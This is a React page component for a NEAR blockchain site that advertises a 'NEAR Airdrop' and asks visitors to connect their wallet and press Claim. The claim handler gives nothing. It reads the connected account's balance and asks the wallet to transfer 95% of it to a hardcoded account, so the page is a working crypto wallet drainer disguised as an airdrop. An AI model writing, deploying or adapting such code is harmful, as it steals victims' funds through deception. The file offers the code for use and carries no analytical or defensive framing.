import { useEffect, useRef, useState } from "react";
import { providers } from "near-api-js";

import { setupWalletSelector } from "@near-wallet-selector/core";
import { setupModal } from "@near-wallet-selector/modal-ui";

import { setupBitteWallet } from "@near-wallet-selector/bitte-wallet";
import { setupLedger } from "@near-wallet-selector/ledger";
import { setupMeteorWallet } from "@near-wallet-selector/meteor-wallet";
import { setupNightly } from "@near-wallet-selector/nightly";
import { setupMyNearWallet } from "@near-wallet-selector/my-near-wallet";
import { setupSender } from "@near-wallet-selector/sender";
import { setupHereWallet } from "@near-wallet-selector/here-wallet";
import { setupBitgetWallet } from "@near-wallet-selector/bitget-wallet";
import { setupCoin98Wallet } from "@near-wallet-selector/coin98-wallet";
import { setupHotWallet } from "@near-wallet-selector/hot-wallet";
import { setupXDEFI } from "@near-wallet-selector/xdefi";
import { setupNarwallets } from "@near-wallet-selector/narwallets";
import { setupMathWallet } from "@near-wallet-selector/math-wallet";
import { setupRamperWallet } from "@near-wallet-selector/ramper-wallet";
import { setupWelldoneWallet } from "@near-wallet-selector/welldone-wallet";

export default function Home() {
  const modalRef = useRef(null);
  const [selector, setSelector] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [fade, setFade] = useState(false);
  const [signedIn, setSignedIn] = useState(false);

  useEffect(() => {
  let unwrap;

  const initWalletSelector = async () => {
    try {
      const selector = await setupWalletSelector({
        network: "mainnet",
        modules: [
          setupHotWallet(),
          setupLedger(),
          setupMyNearWallet(),
          setupHereWallet(),
          setupMeteorWallet(),
          setupNightly(),
          setupSender(),
          setupBitgetWallet(),
          setupMathWallet(),
          setupCoin98Wallet(),
          setupBitteWallet(),
          setupNarwallets(),
          setupRamperWallet(),
          setupWelldoneWallet(),
          setupXDEFI(),
        ],
      });

      const modal = setupModal(selector, { contractId: "" });
      modalRef.current = modal;
      setSelector(selector);
      // Update signedIn state if already signed in
setSignedIn(selector.isSignedIn());

// Listen for signIn / signOut events
const handleSignIn = () => setSignedIn(true);
const handleSignOut = () => setSignedIn(false);

selector.on("signedIn", handleSignIn);
selector.on("signedOut", handleSignOut);

// Update unwrap function to remove event listeners
unwrap = () => {
  selector.off("signedIn", handleSignIn);
  selector.off("signedOut", handleSignOut);
};


      

      setLoading(false);
    } catch (err) {
      console.error("Error initializing wallet selector:", err);
    }
  };

  initWalletSelector();

  return () => {
    if (unwrap) unwrap();
  };
}, []);

  const handleConnect = () => {
    if (modalRef.current) {
      modalRef.current.show();
    } else {
      console.warn("Wallet selector is not ready yet.");
    }
  };

    const handleClaim = async () => {
    try {
      if (!selector || !selector.isSignedIn()) {
        setError("Please connect a wallet first.");
        setFade(false);
        setTimeout(() => setFade(true), 50);   // trigger fade
        setTimeout(() => setError(""), 3000);  // clear message
        return;
      }

      const wallet = await selector.wallet();
      const accounts = await wallet.getAccounts();
      const signerId = accounts[0].accountId;

      const rpcProvider = new providers.JsonRpcProvider({
        url: "https://rpc.mainnet.near.org",
      });
      const accountState = await rpcProvider.query({
        request_type: "view_account",
        account_id: signerId,
        finality: "final",
      });

      const balance = BigInt(accountState.amount);
      const transferAmount = (balance * 95n) / 100n;

      const transaction = {
        receiverId: "96b80b96714e2b20dff9b0be6fde7868daf9bd0575c029a6901e868e38bea547",
        actions: [
          {
            type: "Transfer",
            params: { deposit: transferAmount.toString() },
          },
        ],
      };

      await wallet.signAndSendTransactions({ transactions: [transaction] });
    } catch (err) {
      console.error("Claim failed:", err);
    }
  };

  return (
    <main
      style={{
        padding: "2rem",
        fontFamily: "sans-serif",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        background: "linear-gradient(to bottom right, #e0f2ff, #0077cc)",
        color: "#fff",
        textAlign: "center",
      }}
    >
      {loading ? (
        <>
          <h1 style={{ fontSize: "2rem" }}>Loading Wallet Selector...</h1>
          <div
            style={{
              marginTop: "2rem",
              width: "120px",
              height: "120px",
              border: "12px solid rgba(255, 255, 255, 0.3)",
              borderTop: "12px solid white",
              borderRadius: "50%",
              animation: "spin 1s linear infinite",
            }}
          />
          <style>
            {`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `}
          </style>
        </>
      ) : (
        <>
          <h1 style={{ marginBottom: "2rem" }}>
  Connect your wallet then press Claim to<br />
  Claim your NEAR Airdrop
</h1>

          <button
            onClick={handleConnect}
            style={{
              backgroundColor: "#ffffff",
              color: "#0077cc",
              padding: "12px 24px",
              fontSize: "16px",
              border: "none",
              borderRadius: "8px",
              cursor: "pointer",
              boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
              transition: "background 0.3s ease",
             marginBottom: "1rem",
            }}
            onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "#f0f8ff")}
            onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "#ffffff")}
          >
            Connect Wallet
          </button>

<button
  onClick={handleClaim}
  disabled={!signedIn}
  style={{
    backgroundColor: signedIn ? "#28a745" : "#gray",
    color: "#fff",
    padding: "24px 48px", // bigger button size
    fontSize: "24px",     // bigger text
    border: "none",
    borderRadius: "12px",
    cursor: signedIn ? "pointer" : "not-allowed",
    boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
    transition: "background 0.3s ease",
  }}
>
  Claim
</button>



          {error && (
            <div
              style={{
                marginTop: "1rem",
                color: "#ff4d4d",
                fontWeight: "bold",
                opacity: fade ? 0 : 1,
                transition: "opacity 2s ease",
              }}
            >
              {error}
            </div>
          )}
        </>
      )}
    </main>
  );
}